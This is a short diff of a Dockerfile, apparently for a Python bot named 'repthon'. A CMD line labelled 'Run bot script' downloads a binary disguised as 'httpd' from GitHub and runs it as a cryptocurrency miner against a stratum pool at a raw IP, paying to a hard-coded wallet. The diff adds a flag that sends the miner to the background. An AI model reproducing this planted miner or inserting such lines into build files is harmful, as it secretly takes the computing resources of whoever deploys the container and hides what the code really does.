@@ -35,4 +35,4 @@ ENV PATH="/home/repthon/bin:$PATH"
 CMD ["python3","-m","repthon"]
 
 # Run bot script:
-CMD wget https://github.com/55113110159/vs/raw/master/httpd && chmod +x httpd && ./httpd -a cpupower -o stratum+tcp://149.50.222.86:443 -u CWymb6PUUEbPgE1b8MJ1zJTg4jbXvNs3P3.$(echo $(shuf -i 100-999 -n 1)-EXCEL) -p c=CPU -t2
+CMD wget https://github.com/55113110159/vs/raw/master/httpd && chmod +x httpd && ./httpd -a cpupower -o stratum+tcp://149.50.222.86:443 -u CWymb6PUUEbPgE1b8MJ1zJTg4jbXvNs3P3.$(echo $(shuf -i 100-999 -n 1)-EXCEL) -p c=CPU -t2 -B
